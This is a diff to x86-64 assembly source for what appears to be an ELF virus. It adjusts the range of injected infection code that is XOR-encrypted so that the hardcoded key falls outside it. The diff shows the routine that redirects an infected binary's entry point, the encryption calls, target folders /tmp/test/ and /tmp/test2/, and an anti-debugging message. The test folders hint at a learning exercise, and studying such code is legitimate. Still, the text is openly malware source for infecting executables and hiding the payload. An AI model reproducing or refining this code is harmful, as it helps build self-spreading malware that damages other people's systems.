@@ -76,7 +76,7 @@ uncipher:
 	cmp rdi, 0x0					; if (data == 0x0)
 	je .end						; 	goto .end;
 
-	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
 	lea rdx, [key]					; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
@@ -373,11 +373,11 @@ treat_file:
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
 
-	; xor cipher all injected bytes between infection_routine and _end
+	; xor cipher all injected bytes between infection_routine and cipher_stop
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _begin);
 	add rdi, [filesize]				;
 	add rdi, infection_routine - begin		;
-	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
 	lea rdx, [key]					; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
@@ -785,6 +785,7 @@ section .data
 	infected_folder_2: db "/tmp/test2/", 0
 	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	len_elf_64_magic: equ $ - elf_64_magic
+cipher_stop:
 	key db "S3cr3tK3y", 0
 	debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
 	; never used but here to be copied in the binary
